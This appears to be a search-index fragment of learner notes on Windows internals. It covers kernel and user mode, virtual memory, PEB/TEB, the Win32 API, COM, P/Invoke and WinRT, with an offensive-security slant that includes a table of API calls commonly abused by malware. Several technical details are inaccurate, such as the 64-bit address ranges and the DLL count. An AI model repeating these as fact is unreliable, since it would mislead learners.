kernel mode time by handling more computations in user mode before passing data to the kernel.</li> </ul>"},{"location":"Windows_Internals/Processor_Modes/#syscall-naming-conventions","title":"Syscall naming conventions","text":"<p>System calls in Windows are often prefixed with <code>Nt</code>, which stands for <code>Windows New Technology (NT)</code>. These calls are the lower-level APIs used internally by the OS. However, some system calls use the <code>Zw</code> prefix. While <code>Zw</code> has no official meaning, it was chosen to avoid naming conflicts with other APIs and to preserve other useful two-letter prefixes for future use.</p> <p>Additionally, many Windows driver support routines use standardized prefixes that indicate which kernel-mode system component implements them:</p> Prefix Kernel component Example routine <code>Cm</code> Configuration manager <code>CmRegisterCallbackEx</code> <code>Ex</code> Executive <code>ExAllocatePool</code> <code>Hal</code> Hardware abstraction layer <code>HalGetAdapter</code> <code>Io</code> I/O manager <code>IoAllocateIrp</code> <code>Ke</code> Kernel core <code>KeSetEvent</code> <code>Mm</code> Memory manager <code>MmUnlockPages</code> <code>Ob</code> Object manager <code>ObReferenceObject</code> <code>Po</code> Power manager <code>PoSetPowerState</code> <code>Tm</code> Transaction manager <code>TmCommitTransaction</code> <code>Nt</code> and <code>Zw</code> Native system services <code>NtCreateFile</code> and <code>ZwCreateFile</code>"},{"location":"Windows_Internals/Processor_Modes/#the-switching-point","title":"The Switching Point","text":"<p>The <code>switch between user mode and kernel mode</code> is facilitated by <code>system and API calls</code>. In some documentation, this transition is referred to as the <code>Switching Point</code>.</p> <p></p>"},{"location":"Windows_Internals/Processor_Modes/#performance-counters-for-mode-transitions","title":"Performance Counters for Mode Transitions","text":"<p>The following performance counters help track the time spent in user and kernel modes:</p> Object Counter Function Processor % Privileged Time Percentage of time that an individual CPU (or all CPUs) has run in kernel mode during a specified interval. Processor % User Time Percentage of time that an individual CPU (or all CPUs) has run in user mode during a specified interval. Process % Privileged Time Percentage of time that the threads in a process have run in kernel mode during a specified interval. Process % User Time Percentage of time that the threads in a process have run in user mode during a specified interval. Thread % Privileged Time Percentage of time that a thread has run in kernel mode during a specified interval. Thread % User Time Percentage of time that a thread has run in user mode during a specified interval."},{"location":"Windows_Internals/Processor_Modes/#the-kernel","title":"The kernel","text":"<p>The <code>kernel</code> itself refers specifically to the OS core that enforces rules and handles system-wide operations. You could see it as the \"heart\" of the operating system. </p> <p>Essentially, it's a software component that sits / interfaces between your hardware and the rest of the OS and software.</p> <p>Here's a simplified list of what the core kernel component actually does:</p> <ul> <li> <p>Manage hardware interaction:</p> <p>Abstract away the physical differences between hardware setups by providing other software with a standardized surface area to interface with.</p> </li> <li> <p>Privilege Separation:</p> <p>Provide a safety mechanism for security and stability by separating user-mode and kernel-mode operations, preventing regular applications from directly accessing hardware.</p> </li> <li> <p>Manage processes &amp; memory:</p> <p>The kernel handles process creation, scheduling, and termination while also managing memory allocation and enforcing access protections.</p> </li> <li> <p>Resource Scheduling &amp; Allocation:</p> <p>The kernel decides how CPU time, memory, and I/O resources are distributed among processes.</p> </li> <li> <p>Inter-Process Communication (IPC):</p> <p>It enables different processes to communicate and share data safely.</p> </li> <li> <p>Event Handling &amp; Interrupts:</p> <p>The kernel responds to hardware and software interrupts to keep the system running smoothly.</p> </li> <li> <p>Handle system calls:</p> <p>The kernel provides a controlled way for user-mode applications to request services (e.g., file access, networking, or process management) through system calls.</p> </li> </ul>"},{"location":"Windows_Internals/Processor_Modes/#types","title":"Types","text":"Kernel type Description Advantage Monolithic kernel The kernel incorporates most of the OS's main functions. Higher performance and easier for programmers to work with. Micro-Kernel The kernel only handles basic functionality leaving other components to the user-space. Ability to kill problematic processes without crashing the system. Hyrbid kernel Tries to incorporate the advantage of both modules. Fast and modular."},{"location":"Windows_Internals/Processor_Modes/#memory","title":"Memory","text":"<p>Contrary to user-mode virtual address space, kernel-mode and device-driver code share a single virtual address space. Each page in virtual memory is protected with a \"tag\" that indicates which read and / or write-operation could be used on that memory based on the processor mode.</p> <p>However, read-only pages that contain static read-only data are not writable from any mode. Additionally, <code>Data Execution Prevention (DEP)</code> if enabled stops code from running in memory areas meant for data, preventing exploits like buffer overflows. However, in kernel mode, there are no such protections\u2014drivers and system code can access any part of system memory without restrictions.</p>"},{"location":"Windows_Internals/Processor_Modes/#driver-signing-and-security","title":"Driver signing and security","text":"<p>Since kernel-mode code has full system access, Microsoft enforces strict driver-signing policies to improve security and stability.</p> <ul> <li>Windows 2000 introduced <code>driver signing</code> to warn/block unsigned plug-and-play drivers.</li> <li>Windows 8.1 (64-bit &amp; ARM) requires all drivers to be signed by a <code>recognized certification authority</code> (<code>Kernel-Mode Code Signing, KMCS</code>). Users cannot install unsigned drivers unless they enable \"Test Mode.\"</li> <li>Windows 10 (Anniversary Update, 2016) tightened requirements:<ul> <li>Drivers must be <code>SHA-2 EV signed and submitted</code> to Microsoft for attestation.</li> <li>Only <code>Microsoft-signed drivers</code> can load, except in \"Test Mode.\"</li> <li>Pre-2015 signed drivers remain valid for now.</li> </ul> </li> <li>Windows Server 2016 further restricts drivers, requiring <code>WHQL certification</code> for additional security and stability.</li> <li>Enterprise configurations (e.g., <code>Device Guard</code>) can customize these policies, enforcing stricter requirements where needed.</li> </ul> <p>These measures are an effort by Microsoft to reduce untrusted third-party drivers in kernel memory, strengthening system security.</p>"},{"location":"Windows_Internals/Terminology/","title":"Services, functions and routines","text":"<p>Some Windows internals terms have different meanings based on it's context.</p> Term Description Example Windows API functions Documented, callable subroutines in the Windows API. <code>CreateProcess</code> Native system services (or system calls) Undocumented, underlying services that are callable from User-mode. <code>NtCreateUserProcess</code> is the internal system service that the Windows <code>CreateProcess</code> function calls. Kernel support functions (or routines) Subroutines of the Windows OS called from Kernel-mode. <code>ExAllocatePoolWithTag</code>, device drivers call this to allocate memory from the <code>Windows system heaps (pools)</code> Windows services Processes started by the Windows service control manager. The <code>Task Scheduler service</code> runs in a User-mode process that supports the <code>schtasks</code> command. Dynamic Link Libraries (DLLs) Callable subroutines linked togheter as a binary file that can be dynamically loade by programs that use these subroutines. <code>Msvcrt.dll</code>, <code>Kernel32.dll</code>, etc."},{"location":"Windows_Internals/Virtual_Memory/","title":"Memory","text":"<p>If you're unfamiliar with what memory is at all take a look at the x86-64 assembly guide.</p> <p>For the sake of windows internals we'll cover memory a little more in-depth.</p>"},{"location":"Windows_Internals/Virtual_Memory/#memory-hierarchy","title":"Memory Hierarchy","text":"<p>Memory in a computer system is structured as a hierarchy, based on speed, size, and proximity to the CPU:</p> Level Type Speed Capacity Proximity 1 (Fastest) Registers Fastest Very small Inside the CPU 2 Cache (L1, L2, L3) Very fast Small Near / inside the CPU 3 RAM Fast Medium Motherboard slots 4 (Slowest) Storage (SSD/HDD) Slow Large External"},{"location":"Windows_Internals/Virtual_Memory/#how-memory-works-together","title":"How Memory Works Together","text":"<ul> <li>Registers hold immediate data for the CPU to process.</li> <li>Cache stores frequently accessed data to reduce the time needed to fetch it from RAM.</li> <li>RAM acts as a workspace for active programs and the operating system.</li> <li>Storage holds long-term data, which is loaded into RAM when needed.</li> <li>Virtual Memory (a part of storage) is used when RAM is full, though it is much slower.</li> </ul>"},{"location":"Windows_Internals/Virtual_Memory/#virtual-memory","title":"Virtual Memory","text":"<p>Virtual memory provides each process with a <code>private virtual address space (VAS)</code> that allows them to access a private address space without directly interacting with physical memory (RAM). Because of this interact with memory as if it was physical memory <code>without the risk of collisions</code>.</p> <p>The theoretical maximum virtual address space is <code>4 GB on a 32-bit x86 system</code>.</p> <p>The theoretical maximum virtual address space is <code>256 TB on a 64-bit modern system</code>.</p> <p>This address space is split in half, the lower half (<code>0x00000000 - 0x7FFFFFFF</code>) is allocated to processes as mentioned above. The upper half (<code>0x80000000 - 0xFFFFFFFF</code>) is allocated to OS memory utilization. </p> <p>The exact address <code>layout ratio</code> from the 32-bit system is allocated to the 64-bit system.</p> <p></p> <p>Administrators can alter this allocation layout for applications that require a larger address space through settings (<code>increaseUserVA</code>) or the AWE (<code>Address Windowing Extensions</code>). Most issues that require settings or AWE are resolved with the increased theoretical maximum.</p> <p>Although this concept does not directly translate to Windows internals or concepts, it is crucial to understand. If understood correctly, it can be leveraged to aid in abusing Windows internals.</p>"},{"location":"Windows_Internals/Virtual_Memory/#why-use-virtual-memory","title":"Why use virtual memory?","text":"<ul> <li>Programs used to crash because they would use more memory than physically available, solution:<ul> <li>A <code>memory map</code> or <code>mapper</code> that is responsible for translating virtual addresses to physical addresses:<ul> <li><code>Efficient memory usage</code>: To prevent a program from using more physical memory than physically possible memory can be <code>swapped between RAM and disk</code> as needed. Shared libraries can also be mapped so that both programs use the same shared library.</li> <li><code>Swap memory</code>: Whenever this data swapping happens the OS will find the oldest data move it to disk and load the accessed address.</li> </ul> </li> </ul> </li> <li> <p>Memory fragmentation used to be an issue. Programs would take up the middle part of the memory space and there would be unusable chunks at the top and bottom. Essentially running out of space.</p> <p>Solution: With virtual memory we can map parts of the program into the available chunks.</p> </li> <li> <p>If a program wouldn't have it's own seperate memory contain then all memory would be shared. This could lead to security issues where a program could write to the same memory as another program.</p> <p>Solution: Because of the mapper, programs can still write to the same memory address within their own address space. These addresses then get mapped to different location in the physical address space.</p> </li> </ul> <p></p> <p>Warning</p> <p>When data is not available in RAM and the OS has to read it from disk, we call this a <code>PAGE FAULT</code>.</p>"},{"location":"Windows_Internals/Virtual_Memory/#page-tables-pages","title":"Page Tables &amp; Pages","text":"<p>To manage memory efficiently, the system needs a way to track where virtual addresses are stored in physical memory. This is done using <code>Page Tables</code>.</p> <p>Each entry in a page table is called a <code>Page Table Entry (PTE)</code>, and it maps a chunk of virtual memory (a \"page\") to a location in physical memory.</p>"},{"location":"Windows_Internals/Virtual_Memory/#why-use-page-tables","title":"Why use page tables?","text":"<p>Imagine every byte or WORD in memory has a unique address, like a street address. Instead of keeping track of every single byte individually, the system groups memory into <code>pages</code> (blocks of memory, <code>typically 4KB in size</code>).</p> <p>How does it work?: - A 32-bit system has <code>4GB of virtual address space</code>. - Instead of managing 4 billion individual addresses, memory is divided into <code>pages of 4KB each</code>. - Each page table now only needs one <code>entry per page</code> instead of one per byte. - This <code>reduces the size</code> of page tables from 4GB to 4MB per program.</p> <p>Each process gets its own page table, which allows the system to manage memory efficiently without conflicts between programs.</p>"},{"location":"Windows_Internals/Virtual_Memory/#two-main-data-structures-in-virtual-memory","title":"Two main data structures in virtual memory","text":"<p>Data structures do essentially what the word means, they structure the data. The two main structures used in memory are the <code>stack</code> and the <code>heap</code>. But there are actually a lot more and they're also important.</p>"},{"location":"Windows_Internals/Virtual_Memory/#memory-layout-overview","title":"Memory layout overview","text":"<p>Here is an extremely simplified overview of how memory is laid out in Windows.</p> <p>Remember that everything within the <code>User-Space or Userland get mapped randomly into memory</code> because of <code>Address space layout randomization (ASLR)</code>.</p> <p></p> <p>Here's another depiction of memory.</p> <p></p> <p>Warning</p> <p>The diagram above shows the direction variables (and any named data, even structures) are put into or taken out of memory. The actual data is put into memory differently. This is why stack diagrams vary so much. You'll often see stack diagrams with the stack and heap growing towards each other or high memory addresses at the top. However, this diagram is the most relevant for reverse engineering. Low addresses being at the top is also the most realistic depiction.</p>"},{"location":"Windows_Internals/Virtual_Memory/#stack","title":"Stack","text":"<p>The stack is a region of memory located in RAM, typically near the upper end of the process's allocated memory space.</p> <p>Its specific location is determined by the operating system and hardware architecture, but it always adheres to certain principles.</p> <p>For now it's important to take note of two things:</p> <ol> <li>When data is pushed onto the stack, the stack grows up (negatively), towards lower memory addresses.</li> <li>When data is popped off the stack, the stack shrinks down, towards higher addresses.</li> </ol> <p>That all may seem odd but remember, it's like a normal numerical list where 1, the lower number, is at the top. 10, the higher number, is at the bottom.</p> <p>To dive deeper into how the stack works read the stack file.</p>"},{"location":"Windows_Internals/Virtual_Memory/#heap","title":"Heap","text":"<p>The heap is a region of memory in RAM that is used for dynamic memory allocation, where variables or objects are created and destroyed at runtime (long-time large data objects). Unlike the stack, the heap is not managed automatically by the CPU; it is managed by the programmer or a memory manager (e.g., the operating system or language runtime).</p> <p>The heap is not really ordered in any way and can just be extended at runtime.</p> <p>Languages like C++ make you manage dynamically allocated objects yourself while other languages like C# have the CLR (Common Language Runtime) of it's .NET framework that manages this.</p> <p>The heap is typically used for data that is dynamic (changing or unpredictable). Things such as structures and user input might be stored on the heap. If the size of the data isn't known at compile-time, it's usually stored on the heap. When you add data to the heap it grows towards higher addresses.</p>"},{"location":"Windows_Internals/Virtual_Memory/#program-image","title":"Program image","text":"<p>This is the <code>program/executable loaded into memory</code>. On Windows, this is typically <code>a Portable Executable (PE)</code>.</p>"},{"location":"Windows_Internals/Virtual_Memory/#memory-directives-or-segments","title":"Memory Directives or Segments","text":"<p>Directives are commands recognized by the compiler used for assembling the program used for different segments/sections in which data or code is stored in memory.</p> <ul> <li>NOT part of the intel instruction set. Recognized by the MASM assembler itself, rather than actual CPU instructions that the processor executes.</li> <li>DO NOT execute at runtime</li> <li>NOT case sensitive</li> </ul>"},{"location":"Windows_Internals/Virtual_Memory/#key-differences-between-x86-and-x86-64-directives","title":"Key Differences Between x86 and x86-64 Directives","text":"Aspect x86 (32-bit) x86-64 (64-bit) Address Space <code>4 GB</code> total for all sections. Vastly larger (up to <code>256 TB</code> practical). Instruction Size 32-bit instructions. 64-bit instructions, with access to more registers and addressing modes. Data Size Variables and pointers are typically <code>32 bits wide</code>. Variables and pointers can be <code>64 bits wide</code>. Register Access Limited to <code>8 general-purpose registers</code> (EAX, EBX, etc.). Access to <code>16 general-purpose registers</code> (RAX, RBX, etc.)."},{"location":"Windows_Internals/Virtual_Memory/#two-main-directives","title":"Two main directives","text":"<ul> <li><code>.data</code>: Stores initialized global and static variables. Values are known at compile time. Like identifiers.</li> <li><code>.code</code>: Stores the executable instructions (program code).</li> </ul>"},{"location":"Windows_Internals/Virtual_Memory/#other-directives","title":"Other directives","text":"<ul> <li> <p><code>.bss</code>: Stores uninitialized global and static variables. Initialized to zero at runtime.</p> </li> <li> <p><code>.stack</code>: Allocated for the runtime stack (automatic variables, function calls).</p> </li> <li> <p><code>.heap</code>: Allocated for dynamically allocated memory (e.g., malloc, new).</p> </li> </ul>"},{"location":"Windows_Internals/Virtual_Memory/#peb","title":"PEB","text":"<p>The Process Environment Block (PEB) is a small memory range that stores <code>information about the process and the loaded modules</code>. One piece of information the PEB contains is \"<code>BeingDebugged</code>\" which can be used to determine if the current process is being debugged.</p> <p>To read more about the PEB structure layout read microsoft learn PEB structure (winternl.h)</p> Storage for process-specific information Environment variables (inherited from the previous process) Command line arguments Current working directory Current loaded modules Heap pointer"},{"location":"Windows_Internals/Virtual_Memory/#teb","title":"TEB","text":"<p>The Thread Environment Block (TEB) is a small memory range that stores <code>information about the currently running thread(s)</code>.</p> Storage for thread-specific information Thread ID Stack range GetLastError TLS  Kernel structure  <pre><code>//0x38 bytes (sizeof)\nstruct _NT_TIB\n{\n    struct _EXCEPTION_REGISTRATION_RECORD* ExceptionList;                   //gs: [0x0]\n    VOID* StackBase;                                                        //0x8\n    VOID* StackLimit;                                                       //0x10\n    VOID* SubSystemTib;                                                     //0x18\n    union\n    {\n        VOID* FiberData;                                                    //0x20\n        ULONG Version;                                                      //0x20\n    };\n    VOID* ArbitraryUserPointer;                                             //0x28\n    struct _NT_TIB* Self;                                                   //0x30\n}; \n</code></pre>"},{"location":"Windows_Internals/Windows_API/","title":"Windows API","text":"<p>Warning</p> <p>If you don't know what an API is, check out API introduction.</p> <p>The Windows API is a type of local / OS API that provides native functionality in <code>User-mode</code> to interact with key components of the Windows operating system.</p>"},{"location":"Windows_Internals/Windows_API/#windows-api-list","title":"Windows API list","text":"<p>Microsoft has brought out a bunch of API's, all with different purposes:</p> <ul> <li> <p>Windows SDK:</p> <ul> <li>WinRT API</li> <li>WinUI 2 for UWP API</li> <li>Win32 API</li> </ul> </li> <li> <p>Windows App SDK:</p> <ul> <li>WinRT API</li> <li>Win32 API</li> <li>COM interop APIs for WinUI</li> <li>C# Interop APIs for WinUI</li> <li>Bootstrapper C# APIs</li> </ul> </li> <li> <p>.NET:</p> <ul> <li>.NET API</li> </ul> </li> <li> <p>Schema specifications</p> <ul> <li>File and XML schema specifications for UWP apps</li> </ul> </li> </ul>"},{"location":"Windows_Internals/Windows_API/#win32-api","title":"Win32 API","text":"<p>Warning</p> <p>The Win32 API is the API commonly referred to as the Windows API. However, in reality the Windows API is the entire collection of API's listed above.</p> <p>We will be looking at the Win32 API, which might be referred to as the Windows API from here on out.</p> <p>The Win32 API is the name given to the original platform for native C/C++ Windows applications that require direct access to Windows and hardware.</p> <p>Before there were 64-bit version of Windows the programming interface to the 32-bit versions of Windows was named the <code>Win32 API (WinNT/Win9x)</code> to distinguish it from the 16-bit <code>Win16 API (DOS)</code>. However, you can use the Win32 API on 32-bit and 64-bit Windows, it just hasn't been renamed.</p> <p>It provides a first-class development experience without depending on a managed runtime environment such as .NET. That makes the Win32 API a great choice for applications that need the highest level of performance, and direct access to system hardware.</p>"},{"location":"Windows_Internals/Windows_API/#history-dde-ole-com","title":"History: DDE, OLE &amp; COM","text":"<p>Originally, Windows provided system functions through the Windows API, which was just a huge collection of C functions. But over time, as Windows grew, this approach became messy. There were thousands of functions with no real organization\u2014just a bunch of names that weren\u2019t always consistent.</p> <p>Enter <code>COM (Component Object Model)</code>, to fix this, Microsoft introduced <code>COM (Component Object Model)</code>. You can think of COM as a better way to organize and access Windows features, making it easier for different programs to work together. Originally, COM was called <code>OLE 2</code> and it started as a way for Office programs (like Word and Excel) to share data with each other.</p> <p>This sharing of data between processes is what we call <code>Inter-Process Communications (IPC)</code>.</p> <p>The ability to exchange data was originally implemented through <code>OLE (Object Linking and Embedding)</code>. Which in turn implemented using and older Windows mechanism named <code>DDE (Dynamic Data Exchange)</code>. However, DDE also had it's own limitations and eventually OLE came along.</p> <p>COM is based on two simple ideas:</p> <ol> <li> <p>Programs talk to COM objects by obtaining <code>interfaces</code>.</p> </li> <li> <p>An interface is just a list of functions that a program can call, like a menu of available actions.</p> </li> <li>These interfaces are designed to work across different programming languages, so they don\u2019t rely on how a specific language (like C++ or C#) handles function calls.</li> <li> <p>This makes it easier for different programs to communicate without running into compatibility issues.</p> </li> <li> <p>COM objects are <code>loaded dynamically</code>. Along with managed <code>object lifetime</code>.</p> </li> <li> <p>Instead of being built directly into a program, COM objects are stored in separate files (DLLs or EXEs).</p> </li> <li>This means programs can load them only when needed, making the system more flexible and modular.</li> </ol> <p>In the end COM provided:</p> <ul> <li>Better organization of Windows features</li> <li>A way for different programs to work togheter.</li> <li>It worked across many programming languages (C, C++, C#, VB, etc.).</li> <li>It allowed Windows features to be updated separately without breaking programs.</li> </ul> <p>COM became the foundation for many later Microsoft technologies, like <code>ActiveX</code>, <code>DirectX</code>, <code>Windows Shell Extensions</code>, and even parts of <code>.NET</code>.</p>"},{"location":"Windows_Internals/Windows_API/#practical-com-example","title":"Practical COM example","text":"<p>Let\u2019s say you\u2019re building a program that needs to generate a Word document, add some text, and save it without actually opening Word on the screen.</p> <p>How does this work?:</p> <ul> <li>Microsoft Word exposes a COM object that allows other programs to control it.</li> <li>Your program can ask Windows to load Word\u2019s COM object in the background (inside a DLL).</li> <li>Your program can then send commands to this hidden instance of Word to create a document, add text, and save it.</li> </ul>"},{"location":"Windows_Internals/Windows_API/#what-is-a-com-server","title":"What is a COM server?","text":"<p>A <code>COM server</code> is just a file (<code>a DLL or an EXE</code>) that contains COM objects / classes. These objects provide specific functionality, like handling files, networking, or controlling Microsoft Word from another program.</p> <p>For example, if a program wants to open and edit a Word document without launching Word itself, it can ask a COM object in Word\u2019s DLL to do it in the background.</p>"},{"location":"Windows_Internals/Windows_API/#subsystem-and-hardware-interaction","title":"Subsystem and Hardware Interaction","text":"<p>Programs often need to access or modify Windows subsystems or hardware but are <code>restricted to maintain machine stability</code>. To solve this problem, Microsoft released the Win32 API, a library to <code>interface between user-mode applications and the kernel</code>.</p> <p>Windows distinguishes hardware access by two distinct modes: <code>user</code> and <code>kernel</code> mode. These modes determine the hardware, kernel, and memory access an application or driver is permitted. <code>API or system calls interface between each mode</code>, sending information to the system to be <code>processed in kernel mode</code>.</p> <p>Read processor modes and system calls to learn more.</p> <p></p>"},{"location":"Windows_Internals/Windows_API/#win32-api-components","title":"Win32 API components","text":"<p>The Win32 API, more commonly known as the Windows API, has several dependent components that are used to define the structure and organization of the API.</p> <p>Let\u2019s break the Win32 API up via a top-down approach. We\u2019ll assume the API is the top layer and the parameters that make up a specific call are the bottom layer. In the table below, we will describe the top-down structure at a high level and dive into more detail later.</p> Layer Explanation API A top-level/general term or theory used to describe any call found in the win32 API structure. Header files or imports Defines libraries to be imported at run-time, defined by header files or library imports. Uses pointers to obtain the function address. Core DLLs A group of four DLLs that define call structures. (KERNEL32, USER32, and ADVAPI32). These DLLs define kernel and user services that are not contained in a single subsystem. Supplemental DLLs Other DLLs defined as part of the Windows API. Controls separate subsystems of the Windows OS. ~36 other defined DLLs. (NTDLL, COM, FVEAPI, etc.) Call Structures Defines the API call itself and parameters of the call. API Calls The API call used within a program, with function addresses obtained from pointers. In/Out Parameters The parameter values that are defined by the call structures."},{"location":"Windows_Internals/Windows_API/#os-libraries-and-aslr","title":"OS Libraries and ASLR","text":"<p>Windows provides a bunch of built-in functions that programs can use. These functions live inside DLL files (Dynamic Link Libraries), which are like toolboxes full of useful code that programs can borrow instead of writing everything from scratch.</p> <p>Examples of Windows DLLs: - <code>kernel32.dll</code> \u2192 Handles things like memory, files, and processes. - <code>user32.dll</code> \u2192 Deals with windows, buttons, and user input. - <code>gdi32.dll</code> \u2192 Helps with graphics and drawing.</p> <p>Every time a program wants to use one of these functions, it needs to <code>find the function inside the DLL</code> and <code>get its memory address (a pointer)</code>.</p> <p>We can't just statically hand out references to the memory address of the function since <code>ASLR (Address Space Layout Randomization)</code> loads it randomly.</p> <p>This is a security feature called ASLR, which makes it harder for malware to predict where functions are in memory. Since the function address changes every time the program runs, we need a way to find it dynamically.</p> <p>The two most popular implementations to do this are: - <code>P/Invoke (Platform Invocation Services)</code></p> <p>Used in C#, VB.NET. other .NET languages to manually tell Windows to use a function from a DLL since because don\u2019t natively work with Windows API functions.</p> <ul> <li>The <code>Windows header file</code></li> </ul> <p>A header file that includes these function pointers provided by Windows that used in C and C++.</p>"},{"location":"Windows_Internals/Windows_API/#the-windows-header-file","title":"The Windows Header File","text":"<p>Microsoft provides low-level programming languages such as C and C++ with a pre-configured set of libraries that we can use to access the API calls.</p> <p>Keeping the concept at a high level, at runtime, the loader will determine what calls are being made and create a <code>thunk table</code> to obtain function addresses or pointers.</p> <p>Once the <code>windows.h</code> file is included at the top of an unmanaged program; any Win32 function can be called.</p> <pre><code>#include &lt;windows.h&gt;\n</code></pre> <p>Take a loot at the bottom ExtProc.h which uses ReadProcessMemory and WriteProcessMemory.</p>"},{"location":"Windows_Internals/Windows_API/#pinvoke","title":"P/Invoke","text":"<p>Microsoft describes P/Invoke or <code>platform invoke</code> as \u201ca technology that allows you to access structs, callbacks, and functions in unmanaged libraries from your managed code.\u201d</p> <ul> <li><code>Managed code</code>:   Code managed by a CLR (Common Language Runtime) like .NET which is used for C#, VB.NET and F#.</li> </ul> <p>Managed code benefits from automatic garbage collection, type safety, and runtime security features.</p> <ul> <li><code>Unmanaged code</code>:   Unmanaged code manages its own memory and execution. It's code that runs directly on the OS, without CLR intervention.</li> </ul> <p>Examples include: C, C++, Win32 API, and system DLLs like kernel32.dll or user32.dll (which are written in those unmanaged languages).</p> <p>P/invoke provides tools to handle the entire process of <code>invoking an unmanaged function from managed code</code> or, in other words, calling the Win32 API in a language like C#. P/invoke will kick off by importing the desired DLL that contains the unmanaged function or Win32 API call.</p> <p>Below is an example of importing a DLL with options.</p> <pre><code>using System;\nusing System.Runtime.InteropServices;\n\npublic class Program\n{\n  // Importing the DLL user32 using the attribute: DLLImport.\n  [DllImport(\"user32.dll\", CharSet = CharSet.Unicode, SetLastError = true)]\n  ...\n} \n</code></pre> <p>Note: a semicolon is not included because the p/invoke function is not yet complete. In the second step, we must <code>define a managed method as an external one</code>. The <code>extern</code> keyword will inform the runtime of the specific DLL that was previously imported.</p> <pre><code>using System;\nusing System.Runtime.InteropServices;\n\npublic class Program\n{\n...\nprivate static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType);\n}\n</code></pre> <p>Now we can invoke the function as a managed method, but we are calling the unmanaged function!</p>"},{"location":"Windows_Internals/Windows_API/#api-call-structure","title":"API Call Structure","text":"<p>API calls are the second main component of the Win32 library. These calls offer extensibility and flexibility that can be used to meet a plethora of use cases. Most Win32 API calls are well documented under the Windows API documentation and pinvoke.</p> <p>API call functionality can be extended by modifying the naming scheme and appending a representational character.</p> <p>Microsoft supported API calls naming scheme:</p> Character Explanation A Represents an 8-bit character set with ANSI encoding W Represents a Unicode encoding Ex Provides extended functionality or in/out parameters to the API call <p>Each API call also has a pre-defined structure to define its in/out parameters. You can find most of these structures on the corresponding API call document page of the Windows documentation, along with explanations of each I/O parameter.</p> <p>The Win32 API functions follow a common format:</p> <ul> <li>Prefix:<ul> <li>Create</li> <li>Get</li> <li>Set</li> <li>Open</li> <li>Close</li> </ul> </li> <li>Keyword:<ul> <li>Reg</li> <li>File</li> <li>Process</li> <li>Library</li> </ul> </li> <li>Suffix:<ul> <li>Ex</li> <li>A</li> <li>W</li> </ul> </li> </ul> <p>Examples: - <code>CreateProcess</code> - <code>LoadLibrary</code> - <code>CloseHandle</code></p> <p>Let\u2019s take a look at the WriteProcessMemory API call as an example. Below is the I/O structure for the call obtained here.</p> <p><pre><code>BOOL WriteProcessMemory(\n  [in]  HANDLE  hProcess,\n  [in]  LPVOID  lpBaseAddress,\n  [in]  LPCVOID lpBuffer,\n  [in]  SIZE_T  nSize,\n  [out] SIZE_T  *lpNumberOfBytesWritten\n);\n</code></pre> For each I/O parameter, Microsoft also explains its use, expected input or output, and accepted values.</p>"},{"location":"Windows_Internals/Windows_API/#commonly-abused-api-calls","title":"Commonly Abused API Calls","text":"<p>Several API calls within the Win32 library lend themselves to be easily leveraged for malicious activity.</p> <p>While many calls are abused, some are seen in the wild more than others. </p> <p>Here's a list of the most common DLLs and what they're used for:</p> Win32 Dynamic Link Library Purpose <code>kernel32.dll</code> Manage processes and threads <code>kernel32.dll</code> Manage memory <code>kernel32.dll</code> Manage files <code>user32.dll</code> Manage the user interface (GUI) <code>advapi32.dll</code> Manage the registry <code>ws2_32.dll</code> Manage networking <code>ws2_32.dll</code> Manage internet activities <p>Below is a table of the most commonly abused API organized by frequency in a collection of samples:</p> API Call Description <code>LoadLibraryA</code> Maps a specified DLL  into the address space of the calling process <code>GetUserNameA</code> Retrieves the name of the user associated with the current thread <code>GetComputerNameA</code> Retrieves a NetBIOS or DNS  name of the local computer <code>GetVersionExA</code> Obtains information about the version of the operating system currently running <code>GetModuleFileNameA</code> Retrieves the fully qualified path for the file of the specified module and process <code>GetStartupInfoA</code> Retrieves contents of STARTUPINFO structure (window station, desktop, standard handles, and appearance of a process) <code>GetModuleHandle</code> Returns a module handle for the specified module if mapped into the calling process's address space <code>GetProcAddress</code> Returns the address of a specified exported DLL  function <code>VirtualProtect</code> Changes the protection on a region of memory in the virtual address space of the calling process"},{"location":"Windows_Internals/Windows_API/#the-windows-runtime-api-winrt","title":"The Windows Runtime API (WinRT)","text":"<p>Windows 8 introduced a new API and the <code>Windows Runtime (WinRT)</code>, the runtime is designed for Windows Apps (previously called Metro, Modern, Immersive, or Windows Store Apps). These apps run on various devices, from IoT and phones to desktops, Xbox One, even on HoloLens.</p> <p>!!! warning}     <code>WinRT</code> is not to be confused with <code>Windows RT</code>, a discontinued ARM-based OS version.</p>"},{"location":"Windows_Internals/Windows_API/#winrt-and-com","title":"WinRT and COM","text":"<p>WinRT is built on / and accesed by COM interfaces, but extends the base COM infrastructure with:</p> <ul> <li>Complete type metadata stored in WINMD files (based on .NET metadata).</li> <li>A more structured API with namespaces, consistent naming, and patterns.</li> </ul> <p>However, unlike traditional Windows applications (now called desktop or classic apps), Windows Apps follow stricter rules called \"management mechanisms\".</p>"},{"location":"Windows_Internals/Windows_API/#api-relationships","title":"API Relationships","text":"<p>WinRT is not a new completely separate or independent system-level API (native API) for the system. Similar to .NET, which provides a modern, high-level framework but still internally leverages the traditional Windows APIs for things like file handling, networking, and UI rendering.</p> <ul> <li>Desktop apps can use some WinRT APIs.</li> <li>Windows Apps can use a limited set of Win32 and COM APIs.</li> <li>WinRT itself is not a new native API, it still relies on traditional Windows binaries and APIs, similar to .NET.</li> </ul> <p>Even though WinRT introduces a new programming model, at the binary level, it still interacts with legacy Windows binaries and APIs. In other words, WinRT is more of a structured wrapper around existing Windows functionality rather than a complete replacement.</p> <p>Warning</p> <p>Not all traditional Windows APIs are accessible from a Windows App. Likewise, not all WinRT APIs are available to classic desktop applications. Some APIs are documented and officially supported, while others exist but are restricted or undocumented.</p> <p>For precise details on which APIs can be used in different types of applications, Microsoft provides official documentation.</p>"},{"location":"Windows_Internals/Windows_API/#winrt-and-programming-languages","title":"WinRT and Programming Languages","text":"<p>WinRT APIs are accessible in multiple languages through <code>language projections</code>:</p> <ul> <li>C++: Uses C++/CX, a Microsoft-specific extension to simplify WinRT usage.</li> <li>C#/.NET: Works naturally with the existing COM interop layer.</li> <li>JavaScript: Uses WinJS but requires HTML for UI design.</li> </ul> <p>Warning</p> <p>Windows Apps using HTML are still local client apps, not web applications loaded from a server.</p>"}]}